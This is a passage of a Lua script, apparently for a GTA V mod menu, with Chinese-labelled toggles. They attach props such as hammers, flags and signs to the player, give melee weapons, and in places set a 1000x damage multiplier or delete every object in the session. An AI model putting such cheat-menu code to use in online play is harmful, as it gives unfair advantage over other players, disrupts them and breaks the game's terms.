    dachuizi = menu.list(funfeatures_self, "大锤", {}, "", function(); end)
local bigbigbig = false
        menu.toggle(dachuizi, "大锤V1", {"bighammer"}, "", function(on)
            if on then
                WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),-1810795771,15,true,true)
                local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(),true)
                dachui = OBJECT.CREATE_OBJECT(util.joaat("prop_bollard_02a"), pos.x, pos.y, pos.z, true, true, false)
                tongzi = OBJECT.CREATE_OBJECT(util.joaat("prop_barrel_02a"), pos.x, pos.y, pos.z, true, true, false)
                menu.trigger_commands("damagemultiplier 1000")
                menu.trigger_commands("rangemultiplier 1.5")
                ENTITY.ATTACH_ENTITY_TO_ENTITY(dachui, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 28422), 0.2, 0.95, 0.2, 105, 30.0, 0, true, true, false, false, 0, true)
                ENTITY.ATTACH_ENTITY_TO_ENTITY(tongzi,dachui, 0,  0, 0, -0.2, -35.0, 100.0,0, true, true, false, false, 0, true)
                util.yield(1000)
                bigbigbig = on
            else
                menu.trigger_commands("damagemultiplier 1")
                menu.trigger_commands("rangemultiplier 1")
                entities.delete_by_handle(dachui)
                entities.delete_by_handle(tongzi)
                bigbigbig = off
                WEAPON.REMOVE_WEAPON_FROM_PED(players.user_ped(),-1810795771)
            end
        end,false)

local bigbarrelqq = false
    menu.toggle(dachuizi, "大锤V2", {""}, "", function(on)
        if on then
            WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),-1810795771,15,true,true)
            local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(),true)
            dachui = OBJECT.CREATE_OBJECT(util.joaat("prop_glass_stack_03"), pos.x, pos.y, pos.z, true, true, false)--prop_gate_farm_post
            tongzi = OBJECT.CREATE_OBJECT(util.joaat("prop_barrel_pile_03"), pos.x, pos.y, pos.z, true, true, false)--h4_prop_h4_barrel_01a
            menu.trigger_commands("damagemultiplier 1000")
            menu.trigger_commands("rangemultiplier 1.5")
            ENTITY.ATTACH_ENTITY_TO_ENTITY(dachui, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 28422), 0.2, 0.95, 0.2, 105, 30.0, 0, true, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(tongzi,dachui, 0,  0, 0, -0.2, -35.0, 100.0,0, true, true, false, false, 0, true)
            util.yield(1000)
            bigbarrelqq = on
        else
        menu.trigger_commands("damagemultiplier 1")
        menu.trigger_commands("rangemultiplier 1")
        entities.delete_by_handle(dachui)
        entities.delete_by_handle(tongzi)
        bigbarrelqq = off
        WEAPON.REMOVE_WEAPON_FROM_PED(players.user_ped(),-1810795771)
    end
end,false)

        menu.toggle(dachuizi, "大锤V3", {""}, "", function(on)
            if on then
                WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),-1810795771,15,true,true)
                local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(),true)
                dachui = OBJECT.CREATE_OBJECT(util.joaat("prop_bollard_02b"), pos.x, pos.y, pos.z, true, true, false)
                tongzi = OBJECT.CREATE_OBJECT(util.joaat("prop_barrel_02b"), pos.x, pos.y, pos.z, true, true, false)
                menu.trigger_commands("damagemultiplier 1000")
                menu.trigger_commands("rangemultiplier 1.5")
                ENTITY.ATTACH_ENTITY_TO_ENTITY(dachui, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 28422), 0.2, 0.95, 0.2, 105, 30.0, 0, true, true, false, false, 0, true)
                ENTITY.ATTACH_ENTITY_TO_ENTITY(tongzi,dachui, 0,  0, 0, -0.2, -35.0, 100.0,0, true, true, false, false, 0, true)
                util.yield(1000)
                bigbigbig = on
            else
                menu.trigger_commands("damagemultiplier 1")
                menu.trigger_commands("rangemultiplier 1")
                entities.delete_by_handle(dachui)
                entities.delete_by_handle(tongzi)
                bigbigbig = off
                WEAPON.REMOVE_WEAPON_FROM_PED(players.user_ped(),-1810795771)
            end
        end,false)

        menu.toggle(dachuizi, "大锤V4", {""}, "", function(on)
            if on then
                WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),-1810795771,15,true,true)
                local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(),true)
                dachui = OBJECT.CREATE_OBJECT(util.joaat("prop_bollard_03a"), pos.x, pos.y, pos.z, true, true, false)
                tongzi = OBJECT.CREATE_OBJECT(util.joaat("prop_barrel_03a"), pos.x, pos.y, pos.z, true, true, false)
                menu.trigger_commands("damagemultiplier 1000")
                menu.trigger_commands("rangemultiplier 1.5")
                ENTITY.ATTACH_ENTITY_TO_ENTITY(dachui, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 28422), 0.2, 0.95, 0.2, 105, 30.0, 0, true, true, false, false, 0, true)
                ENTITY.ATTACH_ENTITY_TO_ENTITY(tongzi,dachui, 0,  0, 0, -0.2, -35.0, 100.0,0, true, true, false, false, 0, true)
                util.yield(1000)
                bigbigbig = on
            else
                menu.trigger_commands("damagemultiplier 1")
                menu.trigger_commands("rangemultiplier 1")
                entities.delete_by_handle(dachui)
                entities.delete_by_handle(tongzi)
                bigbigbig = off
                WEAPON.REMOVE_WEAPON_FROM_PED(players.user_ped(),-1810795771)
            end
        end,false)

        menu.toggle(dachuizi, "大锤V5", {""}, "", function(on)
            if on then
                WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),-1810795771,15,true,true)
                local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(),true)
                dachui = OBJECT.CREATE_OBJECT(util.joaat("prop_bollard_04"), pos.x, pos.y, pos.z, true, true, false)
                tongzi = OBJECT.CREATE_OBJECT(util.joaat("prop_barrel_03d"), pos.x, pos.y, pos.z, true, true, false)
                menu.trigger_commands("damagemultiplier 1000")
                menu.trigger_commands("rangemultiplier 1.5")
                ENTITY.ATTACH_ENTITY_TO_ENTITY(dachui, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 28422), 0.2, 0.95, 0.2, 105, 30.0, 0, true, true, false, false, 0, true)
                ENTITY.ATTACH_ENTITY_TO_ENTITY(tongzi,dachui, 0,  0, 0, -0.2, -35.0, 100.0,0, true, true, false, false, 0, true)
                util.yield(1000)
                bigbigbig = on
            else
                menu.trigger_commands("damagemultiplier 1")
                menu.trigger_commands("rangemultiplier 1")
                entities.delete_by_handle(dachui)
                entities.delete_by_handle(tongzi)
                bigbigbig = off
                WEAPON.REMOVE_WEAPON_FROM_PED(players.user_ped(),-1810795771)
            end
        end,false)

        menu.toggle(dachuizi, "大锤V6", {""}, "", function(on)
            if on then
                WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),-1810795771,15,true,true)
                local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(),true)
                dachui = OBJECT.CREATE_OBJECT(util.joaat("prop_bollard_05"), pos.x, pos.y, pos.z, true, true, false)
                tongzi = OBJECT.CREATE_OBJECT(util.joaat("prop_barbell_80kg"), pos.x, pos.y, pos.z, true, true, false)
                menu.trigger_commands("damagemultiplier 1000")
                menu.trigger_commands("rangemultiplier 1.5")
                ENTITY.ATTACH_ENTITY_TO_ENTITY(dachui, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 28422), 0.2, 0.95, 0.2, 105, 30.0, 0, true, true, false, false, 0, true)
                ENTITY.ATTACH_ENTITY_TO_ENTITY(tongzi,dachui, 0,  0, 0, -0.2, -35.0, 100.0,0, true, true, false, false, 0, true)
                util.yield(1000)
                bigbigbig = on
            else
                menu.trigger_commands("damagemultiplier 1")
                menu.trigger_commands("rangemultiplier 1")
                entities.delete_by_handle(dachui)
                entities.delete_by_handle(tongzi)
                bigbigbig = off
                WEAPON.REMOVE_WEAPON_FROM_PED(players.user_ped(),-1810795771)
            end
        end,false)

        menu.toggle(dachuizi, "大锤V7", {""}, "", function(on)
            if on then
                WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),-1810795771,15,true,true)
                local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(),true)
                dachui = OBJECT.CREATE_OBJECT(util.joaat("prop_bomb_01"), pos.x, pos.y, pos.z, true, true, false)
                tongzi = OBJECT.CREATE_OBJECT(util.joaat("prop_barrachneon"), pos.x, pos.y, pos.z, true, true, false)
                menu.trigger_commands("damagemultiplier 1000")
                menu.trigger_commands("rangemultiplier 1.5")
                ENTITY.ATTACH_ENTITY_TO_ENTITY(dachui, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 28422), 0.2, 0.95, 0.2, 105, 30.0, 0, true, true, false, false, 0, true)
                ENTITY.ATTACH_ENTITY_TO_ENTITY(tongzi,dachui, 0,  0, 0, -0.2, -35.0, 100.0,0, true, true, false, false, 0, true)
                util.yield(1000)
                bigbigbig = on
            else
                menu.trigger_commands("damagemultiplier 1")
                menu.trigger_commands("rangemultiplier 1")
                entities.delete_by_handle(dachui)
                entities.delete_by_handle(tongzi)
                bigbigbig = off
                WEAPON.REMOVE_WEAPON_FROM_PED(players.user_ped(),-1810795771)
            end
        end,false)

        menu.toggle(dachuizi, "大锤V8", {""}, "", function(on)
            if on then
                WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),-1810795771,15,true,true)
                local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(),true)
                dachui = OBJECT.CREATE_OBJECT(util.joaat("prop_bollard_01c"), pos.x, pos.y, pos.z, true, true, false)
                tongzi = OBJECT.CREATE_OBJECT(util.joaat("prop_barier_conc_01a"), pos.x, pos.y, pos.z, true, true, false)
                menu.trigger_commands("damagemultiplier 1000")
                menu.trigger_commands("rangemultiplier 1.5")
                ENTITY.ATTACH_ENTITY_TO_ENTITY(dachui, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 28422), 0.2, 0.95, 0.2, 105, 30.0, 0, true, true, false, false, 0, true)
                ENTITY.ATTACH_ENTITY_TO_ENTITY(tongzi,dachui, 0,  0, 0, -0.2, -35.0, 100.0,0, true, true, false, false, 0, true)
                util.yield(1000)
                bigbigbig = on
            else
                menu.trigger_commands("damagemultiplier 1")
                menu.trigger_commands("rangemultiplier 1")
                entities.delete_by_handle(dachui)
                entities.delete_by_handle(tongzi)
                bigbigbig = off
                WEAPON.REMOVE_WEAPON_FROM_PED(players.user_ped(),-1810795771)
            end
        end,false)

        menu.toggle(dachuizi, "大锤V9", {""}, "", function(on)
            if on then
                WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),-1810795771,15,true,true)
                local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(),true)
                dachui = OBJECT.CREATE_OBJECT(util.joaat("prop_bollard_01c"), pos.x, pos.y, pos.z, true, true, false)
                tongzi = OBJECT.CREATE_OBJECT(util.joaat("prop_boogbd_stack_01"), pos.x, pos.y, pos.z, true, true, false)
                menu.trigger_commands("damagemultiplier 1000")
                menu.trigger_commands("rangemultiplier 1.5")
                ENTITY.ATTACH_ENTITY_TO_ENTITY(dachui, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 28422), 0.2, 0.95, 0.2, 105, 30.0, 0, true, true, false, false, 0, true)
                ENTITY.ATTACH_ENTITY_TO_ENTITY(tongzi,dachui, 0,  0, 0, -0.2, -35.0, 100.0,0, true, true, false, false, 0, true)
                util.yield(1000)
                bigbigbig = on
            else
                menu.trigger_commands("damagemultiplier 1")
                menu.trigger_commands("rangemultiplier 1")
                entities.delete_by_handle(dachui)
                entities.delete_by_handle(tongzi)
                bigbigbig = off
                WEAPON.REMOVE_WEAPON_FROM_PED(players.user_ped(),-1810795771)
            end
        end,false)

menu.toggle(funfeatures_self, "掏出诺基亚", {}, "", function(on)
    while not STREAMING.HAS_ANIM_DICT_LOADED("amb@world_human_mobile_film_shocking@female@base") do 
        STREAMING.REQUEST_ANIM_DICT("amb@world_human_mobile_film_shocking@female@base")
        util.yield()
    end
    if on then
    local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped(),true)
    guitar = OBJECT.CREATE_OBJECT(util.joaat("prop_v_m_phone_01"), pos.x, pos.y, pos.z, true, true, false)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(players.user_ped())
    TASK.TASK_PLAY_ANIM(players.user_ped(), "amb@world_human_mobile_film_shocking@female@base", "base", 10, 3, -1, 51, 5, false, false, false) --play anim 
    ENTITY.ATTACH_ENTITY_TO_ENTITY(guitar, players.user_ped(), PED.GET_PED_BONE_INDEX(players.user_ped(), 24818), 0.52,0.43,-0.16,0.2,70,340, false, true, false, true, 1, true)
    PED.SET_ENABLE_HANDCUFFS(players.user_ped(),on)
    else
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped())
        PED.SET_ENABLE_HANDCUFFS(players.user_ped(),off)
        entities.delete_by_handle(guitar)
    end
end)

menu.toggle(funfeatures_self, "高尔夫背包1",{""}, "",function(on)
    local six = "prop_golf_bag_01b"
    if on then     
        attach_to_player(six, 0, 0, -0.3, 0.3, 0, 0,0)
    else
        delete_object(six)
    end
end)

menu.toggle(funfeatures_self, "高尔夫背包2",{""}, "",function(on)
    local six = "prop_golf_bag_01c"
    if on then     
        attach_to_player(six, 0, 0, -0.3, 0.3, 0, 0,0)
    else
        delete_object(six)
    end
end)

    toubushuzi = menu.list(funfeatures_self, "头部显示", {}, "", function(); end)
menu.toggle(toubushuzi, "250",{""}, "",function(on)
    local six = "prop_mp_num_5"
    local sixs = "prop_mp_num_2"
    local sixss = "prop_mp_num_0"
    if on then     
        attach_to_player(six, 0, 0.0, 0, 1.7, 0, 0,0)
        attach_to_player(sixss, 0, 1.0, 0, 1.7, 0, 0,0)
        attach_to_player(sixs, 0, -1.0, 0, 1.7, 0, 0,0)
    else
        delete_object(six)
        delete_object(sixss)
        delete_object(sixs)
    end
end)

menu.toggle(toubushuzi, "520",{""}, "",function(on)
    local six = "prop_mp_num_5"
    local sixs = "prop_mp_num_2"
    local sixss = "prop_mp_num_0"
    if on then     
        attach_to_player(sixs, 0, 0.0, 0, 1.7, 0, 0,0)
        attach_to_player(sixss, 0, 1.0, 0, 1.7, 0, 0,0)
        attach_to_player(six, 0, -1.0, 0, 1.7, 0, 0,0)
    else
        delete_object(six)
        delete_object(sixss)
        delete_object(sixs)
    end
end)

menu.toggle(toubushuzi, "球",{""}, "",function(on)
    local six = "v_ilev_exball_blue"
    if on then     
        attach_to_player(six, 0, 0, 0, 0.8, 0, 0,0)
    else
        delete_object(six)
    end
end)

menu.toggle(toubushuzi, "炸弹",{""}, "",function(on)
    local six = "imp_prop_bomb_ball"
    if on then     
        attach_to_player(six, 0, 0, 0, 0.8, 0, 0,0)
    else
        delete_object(six)
    end
end)

menu.toggle(toubushuzi, "七叶草",{""}, "",function(on)
    local six = "prop_ex_weed_wh"
    if on then     
        attach_to_player(six, 2, 0, 0, 1.7, 0, 360,0)
    else
        delete_object(six)
    end
end)

menu.toggle(toubushuzi, "嘟嘟车",{""}, "",function(on)
    local sixs = "prop_entityxf_covered"
    if on then     
        attach_to_player(sixs, 2, 0.0, 0, -0.8, 0, 0,0)
    else
        delete_object(sixs)
    end
end)

menu.toggle(toubushuzi, "光头遗照",{""}, "",function(on)
    local sixs = "prop_employee_month_01"
    if on then     
        attach_to_player(sixs, 2, 0.0, 0, 1.7, 0, 0,180)
    else
        delete_object(sixs)
    end
end)

menu.toggle(toubushuzi, "小富遗照",{""}, "",function(on)
    local sixs = "prop_employee_month_02"
    if on then     
        attach_to_player(sixs, 2, 0.0, 0, 1.7, 0, 0,180)
    else
        delete_object(sixs)
    end
end)

menu.toggle(toubushuzi, "中国国旗",{""}, "",function(on)
    local six = "apa_prop_flag_china"
    if on then     
        attach_to_player(six, 2, 0, 0, 1.7, 0, 360,0)
    else
        delete_object(six)
    end
end)

menu.toggle(toubushuzi, "国旗1",{""}, "",function(on)
    local six = "prop_flag_sheriff_s"
    if on then     
        attach_to_player(six, 2, 0, 0, 1.7, 0, 360,0)
    else
        delete_object(six)
    end
end)

menu.toggle(toubushuzi, "国旗2",{""}, "",function(on)
    local six = "prop_flag_canada_s"
    if on then     
        attach_to_player(six, 2, 0, 0, 1.7, 0, 360,0)
    else
        delete_object(six)
    end
end)

menu.toggle(toubushuzi, "国旗3",{""}, "",function(on)
    local six = "prop_flag_eu_s"
    if on then     
        attach_to_player(six, 2, 0, 0, 1.7, 0, 360,0)
    else
        delete_object(six)
    end
end)

menu.toggle(toubushuzi, "国旗4",{""}, "",function(on)
    local six = "prop_flag_german_s"
    if on then     
        attach_to_player(six, 2, 0, 0, 1.7, 0, 360,0)
    else
        delete_object(six)
    end
end)

menu.toggle(toubushuzi, "国旗5",{""}, "",function(on)
    local six = "prop_flag_ireland_s"
    if on then     
        attach_to_player(six, 2, 0, 0, 1.7, 0, 360,0)
    else
        delete_object(six)
    end
end)

menu.toggle(toubushuzi, "国旗6",{""}, "",function(on)
    local six = "prop_flag_japan_s"
    if on then     
        attach_to_player(six, 2, 0, 0, 1.7, 0, 360,0)
    else
        delete_object(six)
    end
end)

menu.toggle(toubushuzi, "国旗7",{""}, "",function(on)
    local six = "prop_flag_ls_s"
    if on then     
        attach_to_player(six, 2, 0, 0, 1.7, 0, 360,0)
    else
        delete_object(six)
    end
end)

menu.toggle(toubushuzi, "国旗8",{""}, "",function(on)
    local six = "prop_flag_mexico_s"
    if on then     
        attach_to_player(six, 2, 0, 0, 1.7, 0, 360,0)
    else
        delete_object(six)
    end
end)

menu.toggle(toubushuzi, "国旗9",{""}, "",function(on)
    local six = "prop_flag_lsfd_s"
    if on then     
        attach_to_player(six, 2, 0, 0, 1.7, 0, 360,0)
    else
        delete_object(six)
    end
end)

menu.toggle(toubushuzi, "国旗10",{""}, "",function(on)
    local six = "prop_flag_us_s"
    if on then     
        attach_to_player(six, 2, 0, 0, 1.7, 0, 360,0)
    else
        delete_object(six)
    end
end)

suijijianqi = function(x)
    local r = math.random(1,5)
    return x[r]
end
wushidao = menu.list(funfeatures_self, "娱乐武器", {}, "", function(); end)

menu.toggle(wushidao, "武士刀",{""}, "",function(on)
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
    local taidao = OBJECT.CREATE_OBJECT(util.joaat("prop_cs_katana_01"), pos.x, pos.y, pos.z, true, true, false)
    if on then
    WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),1317494643,15,true,true)
    WEAPON.SET_PED_CURRENT_WEAPON_VISIBLE(PLAYER.PLAYER_PED_ID(), not on, false, false, false)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(taidao, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 28422), 0.07, 0, 0, -100, 0.0, 0, true, true, true, true, 0, true)
    else
        WEAPON.REMOVE_WEAPON_FROM_PED(players.user_ped(),1317494643)
        local count = 0
			for k,ent in pairs(entities.get_all_objects_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				count = count + 1
				util.yield()
			end
    end
end)

menu.toggle(funfeatures_self, "灯架",{""}, "",function(on)
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
    local taidao = OBJECT.CREATE_OBJECT(util.joaat("prop_kino_light_02"), pos.x, pos.y, pos.z, true, true, false)
    if on then
    WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),1317494643,15,true,true)
    WEAPON.SET_PED_CURRENT_WEAPON_VISIBLE(PLAYER.PLAYER_PED_ID(), not on, false, false, false)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(taidao, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 28422), 0.07, 0, 0, -100, 0.0, 0, true, true, true, true, 0, true)
    else
        WEAPON.REMOVE_WEAPON_FROM_PED(players.user_ped(),1317494643)
        local count = 0
			for k,ent in pairs(entities.get_all_objects_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				count = count + 1
				util.yield()
			end
    end
end)

menu.toggle(wushidao, "键盘",{""}, "",function(on)
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
    local taidao = OBJECT.CREATE_OBJECT(util.joaat("prop_cs_keyboard_01"), pos.x, pos.y, pos.z, true, true, false)
    if on then
    WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),1317494643,15,true,true)
    WEAPON.SET_PED_CURRENT_WEAPON_VISIBLE(PLAYER.PLAYER_PED_ID(), not on, false, false, false)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(taidao, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 28422), 0.3, 0, 0, -360, 0.5, 0, true, true, true, true, 0, true)
    else
        WEAPON.REMOVE_WEAPON_FROM_PED(players.user_ped(),1317494643)
        local count = 0
			for k,ent in pairs(entities.get_all_objects_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				count = count + 1
				util.yield()
			end
    end
end)

menu.toggle(wushidao, "高尔夫球杆",{""}, "",function(on)
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
    local taidao = OBJECT.CREATE_OBJECT(util.joaat("prop_golf_driver"), pos.x, pos.y, pos.z, true, true, false)
    if on then
    WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),1317494643,15,true,true)
    WEAPON.SET_PED_CURRENT_WEAPON_VISIBLE(PLAYER.PLAYER_PED_ID(), not on, false, false, false)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(taidao, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 28422), 0.05, 0, 0, 120, 0.5, 0, true, true, true, true, 0, true)
    else
        WEAPON.REMOVE_WEAPON_FROM_PED(players.user_ped(),1317494643)
        local count = 0
			for k,ent in pairs(entities.get_all_objects_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				count = count + 1
				util.yield()
			end
    end
end)

menu.toggle(wushidao, "凳子",{""}, "",function(on)
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
    local taidao = OBJECT.CREATE_OBJECT(util.joaat("prop_cs_office_chair"), pos.x, pos.y, pos.z, true, true, false)
    if on then
    WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),1317494643,15,true,true)
    WEAPON.SET_PED_CURRENT_WEAPON_VISIBLE(PLAYER.PLAYER_PED_ID(), not on, false, false, false)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(taidao, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 28422), 0.32, 0.05, 0.28, -90, 0.5, 0, true, true, true, true, 0, true)
    else
        WEAPON.REMOVE_WEAPON_FROM_PED(players.user_ped(),1317494643)
        local count = 0
			for k,ent in pairs(entities.get_all_objects_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				count = count + 1
				util.yield()
			end
    end
end)

menu.toggle(wushidao, "娃哈哈",{""}, "",function(on)
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
    local taidao = OBJECT.CREATE_OBJECT(util.joaat("prop_energy_drink"), pos.x, pos.y, pos.z, true, true, false)
    if on then
    WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),1317494643,15,true,true)
    WEAPON.SET_PED_CURRENT_WEAPON_VISIBLE(PLAYER.PLAYER_PED_ID(), not on, false, false, false)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(taidao, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 28422), 0.05, 0.05, 0, -90, 0.5, 0, true, true, true, true, 0, true)
    else
        WEAPON.REMOVE_WEAPON_FROM_PED(players.user_ped(),1317494643)
        local count = 0
			for k,ent in pairs(entities.get_all_objects_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				count = count + 1
				util.yield()
			end
    end
end)

menu.toggle(wushidao, "队长盾牌",{""}, "",function(on)
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
    local taidao = OBJECT.CREATE_OBJECT(util.joaat("prop_ex_b_shark"), pos.x, pos.y, pos.z, true, true, false)
    if on then
    WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),1317494643,15,true,true)
    WEAPON.SET_PED_CURRENT_WEAPON_VISIBLE(PLAYER.PLAYER_PED_ID(), not on, false, false, false)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(taidao, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 28422), 0.05, 0.05, 0, -90, 0.5, 0, true, true, true, true, 0, true)
    else
        WEAPON.REMOVE_WEAPON_FROM_PED(players.user_ped(),1317494643)
        local count = 0
			for k,ent in pairs(entities.get_all_objects_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				count = count + 1
				util.yield()
			end
    end
end)

menu.toggle(wushidao, "队长盾牌2",{""}, "",function(on)
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
    local taidao = OBJECT.CREATE_OBJECT(util.joaat("prop_ex_b_shark_g"), pos.x, pos.y, pos.z, true, true, false)
    if on then
    WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),1317494643,15,true,true)
    WEAPON.SET_PED_CURRENT_WEAPON_VISIBLE(PLAYER.PLAYER_PED_ID(), not on, false, false, false)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(taidao, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 28422), 0.05, 0.05, 0, -90, 0.5, 0, true, true, true, true, 0, true)
    else
        WEAPON.REMOVE_WEAPON_FROM_PED(players.user_ped(),1317494643)
        local count = 0
			for k,ent in pairs(entities.get_all_objects_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				count = count + 1
				util.yield()
			end
    end
end)

menu.toggle(wushidao, "队长盾牌3",{""}, "",function(on)
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
    local taidao = OBJECT.CREATE_OBJECT(util.joaat("prop_ex_b_shark_p"), pos.x, pos.y, pos.z, true, true, false)
    if on then
    WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),1317494643,15,true,true)
    WEAPON.SET_PED_CURRENT_WEAPON_VISIBLE(PLAYER.PLAYER_PED_ID(), not on, false, false, false)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(taidao, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 28422), 0.05, 0.05, 0, -90, 0.5, 0, true, true, true, true, 0, true)
    else
        WEAPON.REMOVE_WEAPON_FROM_PED(players.user_ped(),1317494643)
        local count = 0
			for k,ent in pairs(entities.get_all_objects_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				count = count + 1
				util.yield()
			end
    end
end)

menu.toggle(wushidao, "队长盾牌4",{""}, "",function(on)
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
    local taidao = OBJECT.CREATE_OBJECT(util.joaat("prop_ex_b_shark_pk"), pos.x, pos.y, pos.z, true, true, false)
    if on then
    WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),1317494643,15,true,true)
    WEAPON.SET_PED_CURRENT_WEAPON_VISIBLE(PLAYER.PLAYER_PED_ID(), not on, false, false, false)
